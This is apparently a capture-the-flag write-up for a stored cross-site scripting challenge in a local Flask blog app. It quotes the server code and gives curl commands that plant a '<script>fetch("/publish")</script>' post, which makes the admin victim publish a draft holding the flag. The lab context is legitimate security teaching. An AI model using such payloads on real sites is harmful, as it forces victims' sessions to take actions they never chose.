# Cross Site Scripting 5

In this challenge, we have `/challenge/server` that will server us a blog post web app. There is a `/challenge/victim`
that will act as the victim.

This is quite a bit different from our previous challenges. We now have a login mechanism. The victim in this case is the `admin`.

Let's see what the `/challenge/victim` does:

```python
challenge_url = "http://challenge.localhost:80/"

print(f"Visiting {challenge_url}")
browser.get(challenge_url)

browser.find_element(By.NAME, "username").send_keys("admin")
browser.find_element(By.NAME, "password").send_keys(open("/flag").read().strip())
browser.find_element(By.NAME, "submit").submit()
```

So, the username is `admin` and the password is `/flag`, which we can also find out from the server-side source:

```python
db.execute("""CREATE TABLE posts AS SELECT ? AS content, "admin" AS author, FALSE AS published""", [flag])
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [flag])

db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")
db.execute("""INSERT INTO users SELECT "hacker" as username, "1337" as password""")
```

In addition to the `user` table, we also have `posts` table that holds the `content`, `author`, and whether the content is `published`.

I am assuming that `published` creates a draft-published mechanism that makes it so that the drafts are not viewable by anyone but the author.

Since the `/flag` is already in the `posts` table as undrafted, we just have to get the `admin` to post it.

I am also thinking that our post, either as the `guest` or `hacker` will be what we use to perform a **stored XSS** that will run when the `admin`
sees our message on the message board.

Let's look at the server in-depth to see what is going on.

First, we will look at the root GET endpoint:

```python
@app.route("/", methods=["GET"])
def challenge_get():
    page = "<html><body>\nWelcome to pwnpost, now with users!<hr>\n"
    username = flask.session.get("username", None)
    if username:
        page += """
            <form action=draft method=post>
              Post:<textarea name=content>Write something!</textarea>
              <input type=checkbox name=publish>Publish
              <input type=submit value=Save>
            </form><br>
            <a href=publish>Publish your drafts!</a>
            <hr>
        """

        for post in db.execute("SELECT * FROM posts").fetchall():
            page += f"""<h2>Author: {post["author"]}</h2>"""
            if post["published"]:
                page += post["content"] + "<hr>\n"
            else:
                page += f"""(Draft post, showing first 5 characters):<br>{post["content"][:5]}<hr>"""
    else:
        page += """
            <form action=login method=post>
              Username:<input type=text name=username>
              Password:<input type=text name=password>
              <input type=submit name=submit value=Login>
            </form><hr>
        """

    return page + "</body></html>"
```

The server checks for session cookies and tries to establish if the user is logged in. If not logged in, it will give you a form to submit.
Otherwise, it will show you a form to submit posts.

On this post submission, we also have a checkmark to indicate whether we want to instantly post this, or to save it as a draft first.

My earlier assumption that a draft can only be seen by the author was false, as going to `challenge.localhost:80` and signing in
as `hacker` allowed me to see the first few characters of the flag.

Anyways, we can also see how the `page` variable is being created here and we get to see where the vulnerability lies.

Our `post["content"]` gets directly put into the html without any cleaning. Therefore, that is where we can inject our js to
get the victim to go to some URL.

We will be doing this by using javascript's `fetc()`.

Let's see what we can make the victim go to, to publish their flag that is in the draft. One clear direction I see is the `/publish` endpoint.

```python
@app.route("/publish", methods=["GET"])
def challenge_publish():
    if "username" not in flask.session:
        flask.abort(403, "Log in first!")

    # https://www.sqlite.org/lang_update.html
    db.execute("UPDATE posts SET published = TRUE WHERE author = ?", [flask.session.get("username")])
    return flask.redirect("/")
```

This looks like exactly what we need! If we can get `admin`, our victim to go here, and accidentally publish their posts, we would be able to see them.

So, let's login as `hacker` (or `guest`, doesn't matter) and then create our `fetch()` payload.

```bash
curl -c cookies.txt 'challenge.localhost:80/login' -d "username=hacker" -d "password=1337" -L
```

I am going to use `curl`, but feel free to use the python `requests` library, as it will be easier to build the payload in the future and keep track
of session information.

Also, we will hit the `/draft` endpoint to implant our payload, but I very well can also just log in using a browser, and typing the payload
into the textarea there as well.

```python
@app.route("/draft", methods=["POST"])
def challenge_draft():
    if "username" not in flask.session:
        flask.abort(403, "Log in first!")

    content = flask.request.form.get("content", "")
    db.execute(
        "INSERT INTO posts (content, author, published) VALUES (?, ?, ?)",
        (content, flask.session.get("username"), bool(flask.request.form.get("publish"))),
    )
    return flask.redirect("/")
```

So looking at the above, once, we login using the `curl` command, we will also publish our payload like so:

```bash
curl -b cookies.txt 'challenge.localhost:80/draft?' -d 'content=<script>fetch("/publish")</script>' -d 'publish=1'
```

Usually a checkbox will send `'on'` if it is checked, `Null` if not. `bool()` will return `True` for anything not
`Null`, so we will set `publish` to `1` here.

Also, we will use the cookies we saved in `cookies.txt`, which has our login information. For the payload, we simply route
whoever loads the page to the `/publish` endpoint, making anyone who "looks" at the root page publish their entire work.

Now, we run `/challenge/victim` to simulate the `admin` logging in and going to the root page. Lo and behold, our **stored XSS**
makes `admin` accidentally publish his entire flag!
